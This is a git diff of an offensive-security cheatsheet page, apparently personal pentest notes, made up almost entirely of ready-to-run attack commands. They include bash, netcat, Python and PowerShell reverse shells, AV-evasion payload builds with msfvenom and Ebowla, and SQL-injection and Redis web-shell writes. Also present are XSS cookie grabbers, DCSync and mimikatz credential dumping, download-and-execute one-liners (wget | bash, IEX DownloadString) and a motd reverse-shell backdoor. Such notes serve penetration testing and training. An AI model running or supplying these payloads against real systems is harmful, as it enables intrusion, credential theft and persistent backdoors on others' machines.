@@ -4,13 +4,15 @@ title: 📜
 permalink: /cheatsheet
 ---
 
-[//]: # (# -- 4 spaces before)
-[//]: # (## -- 3 spaces before)
-[//]: # (### -- 2 spaces before)
-[//]: # (#### -- 1 spaces before)
+[//]: # (# -- 5 spaces before)
+[//]: # (## -- 4 spaces before)
+[//]: # (### -- 3 spaces before)
+[//]: # (#### -- 2 spaces before)
+[//]: # (##### -- 1 spaces before)
 
 * TOC
 {:toc}
+
 
 
 
@@ -19,7 +21,9 @@ permalink: /cheatsheet
 
 
 
+
 ## Reverse Shells
+
 
 
 ### Bash
@@ -30,11 +34,13 @@ root@kali:$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT
 ```
 
 
+
 ### Netcat
 
 ```
 root@kali:$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
 ```
+
 
 
 ### Python
@@ -56,6 +62,7 @@ root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,sock
 ```
 
 
+
 ### Powershell
 
 Invoke-Expression (UTF-16LE):
@@ -75,6 +82,7 @@ PS> cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 ```
 
 1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
+
 
 
 ### Meterpreter
@@ -100,11 +108,13 @@ PS> powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_at
 1. [github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
 
+
 ### Listeners
 
 ```
 root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 ```
+
 
 
 ### Upgrade to PTY
@@ -137,7 +147,9 @@ user@remote:$ export TERM=xterm
 
 
 
+
 ## SMB
+
 
 
 ### mount
@@ -162,6 +174,7 @@ root@kali:~# umount /mnt/smb
 ```
 
 
+
 ### impacket-smbserver
 
 SMB server (communicate with Windows **[1]**):
@@ -177,7 +190,7 @@ Mount SMB in Windows with `net use`:
 ```
 root@kali:$ impacket-smbserver -username snovvcrash -password qwe123 -smb2support share `pwd`
 PS> net use Z: \\10.10.14.16\share
-PS> net use \\10.10.14.16\share /u:snovvcrash qwe123
+PS> net use Z: \\10.10.14.16\share /u:snovvcrash qwe123
 ```
 
 Mount SMB in Windows with `New-PSDrive`:
@@ -191,6 +204,7 @@ PS> cd Z:
 ```
 
 
+
 ### smbmap
 
 Null authentication:
@@ -199,6 +213,7 @@ Null authentication:
 root@kali:$ smbmap -H 127.0.0.1 -u anonymous -R
 root@kali:$ smbmap -H 127.0.0.1 -u null -p "" -R
 ```
+
 
 
 ### smbclient
@@ -215,6 +230,7 @@ With user creds:
 ```
 root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' qwe123
 ```
+
 
 
 ### crackmapexec
@@ -236,7 +252,9 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 
 
 
+
 ## AD
+
 
 
 ### Impacket
@@ -251,7 +269,9 @@ root@kali:$ python3 -m pip install --upgrade .
 1. [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 
 
+
 ### Dump Users from DCE/RPC SAMR
+
 
 #### rpcclient
 
@@ -263,17 +283,21 @@ rpcclient $> enumdomusers
 rpcclient $> enumdomgroups
 ```
 
+
 #### enum4linux
 
 ```
 root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 ```
 
+
 #### nullinux.py
 
 ```
-root@kali:$ ./nullinux.py 127.0.0.1
+root@kali:$ git clone https://github.com/m8r0wn/nullinux /opt/nullinux && cd /opt/nullinux && sudo bash setup.sh && ln -s /opt/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
+root@kali:$ nullinux.py 127.0.0.1
 ```
+
 
 #### samrdump.py (Impacket)
 
@@ -282,12 +306,13 @@ root@kali:$ samrdump.py 127.0.0.1
 ```
 
 
+
 ### AS_REP Roasting
 
 GetNPUsers.py (Impacket):
 
 ```
-root@kali:$ GetNPUsers.py example.local/ -dc-ip 127.0.0.1 -k -no-pass -usersfile users.txt -request -format john -outputfile asrep.hash
+root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile users.txt -request -format john -outputfile asrep.hash
 root@kali:$ john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
@@ -299,6 +324,7 @@ PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 
 1. [github.com/swisskyrepo/PayloadsAllTheThings/blob/master/krb_as_rep-roasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)
+
 
 
 ### DCSync
@@ -313,6 +339,7 @@ PS> Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members snovvcra
 PS> Add-ADGroupMember -Identity 'Remote Management Users' -Members snovvcrash
 ```
 
+
 #### Powerview (v2)
 
 ```
@@ -321,24 +348,27 @@ PS> Add-ObjectAcl -TargetDistinguishedName 'DC=example,DC=local' -PrincipalName 
 
 1. [vulndev.io/notes/2019/01/01/ad.html](https://vulndev.io/notes/2019/01/01/ad.html)
 
+
 #### ntlmrelayx.py + secretsdump.py (Impacket)
 
 ```
 root@kali:$ ntlmrelayx.py -t ldap://127.0.0.1 --escalate-user snovvcrash
-root@kali:$ secretsdump.py example.local/snovvcrash:qwe123@127.0.0.1 -just-dc
+root@kali:$ secretsdump.py EXAMPLE.LOCAL/snovvcrash:qwe123@127.0.0.1 -just-dc
 ```
 
 1. [dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 2. [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 
+
 #### aclpwn.py
 
 ```
-root@kali:$ aclpwn -f snovvcrash -ft user -t example.local -tt domain -d example.local -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p qwe123 -sp qwe123
+root@kali:$ aclpwn -f snovvcrash -ft user -t EXAMPLE.LOCAL -tt domain -d EXAMPLE.LOCAL -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p qwe123 -sp qwe123
 ```
 
 1. [www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
 2. [www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)
+
 
 #### Manually
 
@@ -367,20 +397,23 @@ PS> Set-acl -aclobject $acl "ad:DC=example,DC=local"
 
 1. [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
 
+
 #### Mimikatz
 
 ```
-PS> lsadump::dcsync /domain:example.local /user:krbtgt@example.local
+PS> lsadump::dcsync /domain:EXAMPLE.LOCAL /user:krbtgt@EXAMPLE.LOCAL
 ```
 
 1. [adsecurity.org/?p=1729](https://adsecurity.org/?p=1729)
 2. [pentestlab.blog/2018/04/09/golden-ticket/](https://pentestlab.blog/2018/04/09/golden-ticket/)
+
 
 #### MISC
 
 * [www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)
 * [github.com/fox-it/Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
 * [gist.github.com/monoxgas/9d238accd969550136db](https://gist.github.com/monoxgas/9d238accd969550136db)
+
 
 
 ### DnsAdmins
@@ -401,6 +434,7 @@ PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 4. [adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
 
 
+
 ### Azure Admins
 
 PS> . ./Azure-ADConnect.ps1
@@ -410,38 +444,43 @@ PS> Azure-ADConnect -server 127.0.0.1 -db ADSync
 * [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
 
 
+
 ### Bloodhound
 
 Setup:
 
 ```
-root@kali:$ git clone https://github.com/BloodHoundAD/BloodHound
-...install [1]...
+* Instal neo4j from [1]
+
 root@kali:$ neo4j console
 ...change default password at localhost:7474...
-^C
+
 root@kali:$ neo4j start
-...download [2]...
+root@kali:$ git clone https://github.com/BloodHoundAD/BloodHound
+root@kali:$ wget [2]
+root@kali:$ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
 root@kali:$ ./BloodHound --no-sandbox
 ```
 
 1. [neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation)
 2. [github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)
 
-Collect graphs via `SharpHound.ps1`:
+Collect graphs via `Ingestors/SharpHound.ps1`:
 
 ```
 PS> . .\SharpHound.ps1
-PS> Invoke-Bloodhound -CollectionMethod All -Domain example.local -LDAPUser snovvcrash -LDAPPass qwe123
+PS> Invoke-Bloodhound -CollectionMethod All -Domain EXAMPLE.LOCAL -LDAPUser snovvcrash -LDAPPass qwe123
 ```
 
-Collect graphs via `bloodHound.py` **[1]** (with running neo4j):
+Collect graphs via `bloodHound.py` **[1]** (with BloodHound running):
 
 ```
-root@kali:$ bloodhound-python -c All -u snovvcrash -p qwe123 -d example.local -ns 127.0.0.1
+root@kali:$ git clone https://github.com/fox-it/BloodHound.py /opt/BloodHound.py && cd /opt/BloodHound.py && python setup.py install && cd -
+root@kali:$ bloodhound-python -c All -u snovvcrash -p qwe123 -d EXAMPLE.LOCAL -ns 127.0.0.1
 ```
 
 1. [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
+
 
 
 ### Tricks
@@ -476,16 +515,20 @@ Or
 PS> New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=example,DC=local" -AccountPassword(ConvertTo-SecureString 'qwe321456' -AsPlainText -Force) -Enabled $true
 ```
 
+
 #### MISC
 
 * [activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
 
 
 
+
 ## UAC Bypass
 
 
+
 ### SystemPropertiesAdvanced.exe
+
 
 #### srrstr.dll
 
@@ -514,6 +557,7 @@ Compile on Kali:
 root@kali:$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
 ```
 
+
 #### DLL Hijacking
 
 Upload `srrstr.dll` to `C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\srrstr.dll` and check it:
@@ -533,14 +577,18 @@ PS> cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 
 
+
 ## AV Bypass
+
 
 
 ### msfvenom
 
 ```
-root@kali:$ msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=127.0.0.1 LPORT=1337 -f exe --platform win -a x86 -o test.exe
+root@kali:$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f exe -o rev.exe
+root@kali:$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e x86/shikata_ga_nai -i 9 -f raw | msfvenom --platform windows -a x86 -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 11 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -k -f exe -o met.exe
 ```
+
 
 
 ### Veil-Evasion
@@ -551,6 +599,7 @@ Hyperion + Pescramble
 root@kali:$ wine hyperion.exe input.exe output.exe
 root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
 ```
+
 
 
 ### GreatSCT
@@ -579,102 +628,22 @@ PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 
 
 
-## Windows
-
-
-### ADS
+### Ebowla
 
 ```
-PS> Get-Item 'file.txt' -Stream *
-PS> Get-Content 'file.txt' -Stream Password
-Or
-PS> type 'file.txt:Password'
+root@kali:$ git clone https://github.com/Genetic-Malware/Ebowla /opt/Ebowla && cd /opt/Ebowla
+root@kali:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
+root@kali:$ pip install configobj
+root@kali:$ python ebowla.py rev.exe genetic.config
+root@kali:$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe
+[+] output/ebowla-rev.exe
 ```
 
-
-### Remote Admin
-
-#### runas
-
-```
-PS> runas /netonly /user:snovvcrash powershell
-```
-
-#### evil-winrm.rb
-
-Install:
-
-```
-root@kali:$ git clone https://github.com/Hackplayers/evil-winrm /opt/evil-winrm
-root@kali:$ ln -s /opt/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
-```
-
-Run:
-
-```
-root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
-```
-
-* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
-
-#### psexec.py
-
-```
-root@kali:$ psexec.py snovvcrash:qwe123@127.0.0.1
-root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
-```
-
-* [github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
-
-#### wmiexec.py
-
-```
-root@kali:$ wmiexec.py snovvcrash:qwe123@127.0.0.1
-root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
-```
-
-* [github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
-
-
-### Registry
-
-Search for creds:
-
-```
-PS> REG QUERY HKLM /f "password" /t REG_SZ /s
-PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword"
-Or
-PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
-```
-
-
-### SDDL
-
-1. [habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
-2. [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
-
-
-### Forensics
-
-Powershell history:
-
-```
-PS> Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
-```
-
-
-### Tricks
-
-File transfer:
-
-```
-Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
-Cmd> type C:\Windows\Temp\encoded.b64
-```
 
 
 
 ## LFI/RFI
+
 
 
 ### PHP RFI with SMB
@@ -705,7 +674,9 @@ root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
 * [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
 
 
+
 ### Log Poisoning
+
 
 #### PHP
 
@@ -734,7 +705,9 @@ root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//pr
 
 
 
+
 ## DBMS
+
 
 
 ### MySQL (MariaDB)
@@ -742,6 +715,7 @@ root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//pr
 ```
 root@kali:$ mysql -u snovvcrash -p'qwe123' -e 'show databases;'
 ```
+
 
 
 ### SQLite
@@ -753,7 +727,9 @@ SELECT username,password FROM secret_database;
 ```
 
 
+
 ### Redis
+
 
 #### Preparation
 
@@ -781,6 +757,7 @@ quit
 Connection closed by foreign host.
 ```
 
+
 #### Web Shell
 
 ```
@@ -792,6 +769,7 @@ root@kali:$ redis-cli -h 127.0.0.1 save
 ```
 
 * [book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
+
 
 #### Inject SSH PubKey
 
@@ -810,7 +788,9 @@ root@kali:$ redis-cli -h 127.0.0.1 save
 
 
 
+
 ## SQLi
+
 
 
 ### sqlmap
@@ -821,6 +801,29 @@ root@kali:$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-des
 ```
 
 * [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
+
+
+
+### DIOS
+
+MySQL:
+
+```
+id=1' UNION SELECT 1,(select (@a) from (select (@a:=0x00),(select (@a) from (information_schema.columns) where (@a) in (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -
+
+SELECT (@a) FROM (
+	SELECT(@a:=0x00), (
+		SELECT (@a) FROM (information_schema.schemata)
+		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
+	)
+) foo
+```
+
+* [defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
+* [www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
+* [dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
+* [www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)
+
 
 
 ### Truncation Attack
@@ -835,11 +838,13 @@ name=snovvcrash&email=admin%example.com++++++++++11&password=qwe123
 * [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
 
 
+
 ### Write File
 
 ```
 id=1' UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
 ```
+
 
 
 ### Read File
@@ -850,10 +855,13 @@ id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
 
 
 
+
 ## XSS
 
 
+
 ### Data Grabbers
+
 
 #### Cookies
 
@@ -878,7 +886,9 @@ body: document.cookie
 * [portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
 
 
+
 ### XMLHttpRequest
+
 
 #### XSS to LFI
 
@@ -898,6 +908,7 @@ xhr.send();
 ```
 
 * [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
+
 
 #### XSS to CSRF
 
@@ -938,7 +949,9 @@ function handleResponse() {
 
 
 
+
 ## Metasploit
+
 
 
 ### Debug
@@ -979,41 +992,206 @@ root@kali:$ vi ~/.msf4/modules/exploits/linux/http/p.rb
 
 
 
-## Recon
+### DNS
+
+```
+root@kali:$ dig axfr @dns.example.com example.com
+```
+
+
+
+### WHOIS
+
+```
+root@kali:$ whois -h whois.example.com example.com
+```
+
+
+
+
+## Post Exploitation
+
+
+
+### Linux
+
+
+#### Recon
+
+`LinEnum.sh`:
+
+```
+root@kali:$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && python3 -m http.server 80
+user@vict:$ wget 127.0.0.1/LinEnum.sh -qO- |bash
+```
+
+`lse.sh`:
+
+```
+root@kali:$ wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && python3 -m http.server 80
+user@vict:$ wget 127.0.0.1/lse.sh -qO- |bash
+```
+
+`linPEAS.sh` (linPEAS):
+
+```
+root@kali:$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh && python3 -m http.server 80
+user@vict:$ wget 127.0.0.1/linpeas.sh -qO- |sh
+```
+
+`pspy`:
+
+```
+root@kali:$ wget [1] && python3 -m http.server 80
+user@vict:$ wget 127.0.0.1/pspy -qO /dev/shm/pspy && cd /dev/shm && chmod +x pspy
+user@vict:$ ./pspy
+```
+
+1. [github.com/DominicBreuker/pspy/releases](https://github.com/DominicBreuker/pspy/releases)
+
+
+#### Rootkits
+
+* [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)
+
 
 
 ### Windows
 
-Initial:
+
+#### Recon
+
+`winPEAS.bat` (winPEAS):
 
 ```
-PS> systeminfo
-PS> whoami /priv (whoami /all)
-PS> PS> gci "$env:userprofile" -recurse | select fullname
-PS> net user
-PS> net localgroup Administrators
-PS> cmdkey /list
-PS> wmic product get name
-PS> tasklist /SVC
-PS> net start
-PS> netstat -ano | findstr LIST
-PS> ipconfig /all
-PS> dir -force c:\
-PS> echo $ExecutionContext.SessionState.LanguageMode
+root@kali:$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite /opt/privilege-escalation-awesome-scripts-suite
+root@kali:$ cp /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
+PS> (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
 ```
+
+`PowerUp.ps1` (PowerSploit):
+
+```
+root@kali:$ git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev /opt/PowerSploit
+root@kali:$ cp /opt/PowerSploit/Privesc/PowerUp.ps1 . && python3 -m http.server 80
+PS> powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
+PS> Invoke-AllChecks |Out-File powerup.txt
+```
+
+`Sherlock.ps1`:
+
+```
+root@kali:$ wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1 && python3 -m http.server 80
+powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
+PS> powershell.exe -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File sherlock.txt}"
+```
+
+`jaws-enum.ps1` (JAWS):
+
+```
+root@kali:$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
+PS> powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
+PS> .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
+```
+
+
+#### Remote Admin
+
+##### runas
+
+```
+PS> runas /netonly /user:snovvcrash powershell
+```
+
+##### evil-winrm.rb
+
+Install:
+
+```
+root@kali:$ git clone https://github.com/Hackplayers/evil-winrm /opt/evil-winrm
+root@kali:$ cd /opt/evil-winrm && bundle install && cd -
+root@kali:$ ln -s /opt/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
+```
+
+Run:
+
+```
+root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
+```
+
+* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+
+##### psexec.py
+
+```
+root@kali:$ psexec.py snovvcrash:qwe123@127.0.0.1
+root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+```
+
+* [github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
+
+##### wmiexec.py
+
+```
+root@kali:$ wmiexec.py snovvcrash:qwe123@127.0.0.1
+root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+```
+
+* [github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
+
+
+#### Registry
+
+Search for creds:
+
+```
+PS> REG QUERY HKLM /f "password" /t REG_SZ /s
+PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
+Or
+PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
+```
+
+
+#### SDDL
+
+1. [habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
+2. [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
+
+
+#### Forensics
+
+Powershell history:
+
+```
+PS> Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+```
+
+
+#### Tricks
+
+File transfer:
+
+```
+Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
+Cmd> type C:\Windows\Temp\encoded.b64
+```
+
 
 
 
 ## PrivEsc
 
 
+
 ### Linux
+
 
 #### Dirty COW
 
 * [dirtycow.ninja/](https://dirtycow.ninja/)
 * [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
 * [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+
 
 #### logrotate
 
@@ -1035,7 +1213,27 @@ $ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
 * [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)
 
 
+#### motd
+
+`/etc/update-motd.d/`:
+
+```
+root@kali:$ shellpop --reverse --number 8 -H 127.0.0.1 -P 1337 --base64
+root@kali:$ echo '<BASE64_SHELL>' >> 00-header
+* Fire up new SSH session and catch the reverse shell
+```
+
+* [www.securityfocus.com/bid/50192/discuss](https://www.securityfocus.com/bid/50192/discuss)
+
+PAM MOTD:
+
+* [www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
+* [www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)
+
+
+
 ### Windows
+
 
 #### Powershell
 
@@ -1051,6 +1249,7 @@ Or
 PS> $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
 PS> Invoke-Command -ScriptBlock { whoami } -Session $s
 ```
+
 
 #### Potatoes
 
@@ -1088,6 +1287,7 @@ cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127
 3. [github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
 4. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
+
 #### wuauserv
 
 ```
@@ -1102,27 +1302,90 @@ PS> Stop-Service wuauserv
 
 
 
-## Rootkits
 
-
-### Linux
-
-* [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)
+## Auth Brute Force
 
 
 
-## Enumeration
+### Hydra
 
 ```
-mkdir -p discovery/{subnets,hosts,services} report/{logs,screenshots} exploitation/
+root@kali:$ hydra -V -t 20 -f -I -L logins.lst -P /usr/share/john/password.lst 127.0.0.1 -s 8888 smtp
+root@kali:$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 8888 ftp
 ```
 
 
-### Host Discovery
+
+### Patator
+
+```
+root@kali:$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
+root@kali:$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
+```
+
+
+
+
+## Wi-Fi
+
+
+
+### Cowpaty + Wpaclean + Aircrack-ng
+
+```
+root@kali:$ cowpatty -r wifi.cap -c
+root@kali:$ wpaclean wificleaned.cap wifi.cap
+root@kali:$ aircrack-ng -w /usr/share/wordlists/rockyou.txt wificleaned.cap
+```
+
+
+
+### Credentials
+
+Windows (netsh):
+
+```
+> netsh wlan show profiles
+> netsh wlan show profiles "ESSID" key=clear
+```
+
+1. [https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks](https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks)
+
+
+
+
+## Password Brute Force
+
+
+
+### Hashcat
+
+```
+root@kali:$ hashcat --example-hashes | grep -B1 -i md5
+root@kali:$ hashcat -m 500 hashes/file.hash /usr/share/wordlists/rockyou.txt --username
+root@kali:$ hashcat -m 500 hashes/file.hash --username --show
+```
+
+
+
+
+
+# Engagement
+
+```
+root@kali:$ mkdir -p discovery/{subnets,hosts,services/names} report/{logs,screenshots} exploitation/
+```
+
+
+
+
+## Host Discovery
 
 CWD: `discovery/`
 
-#### Hunt for Subnets
+
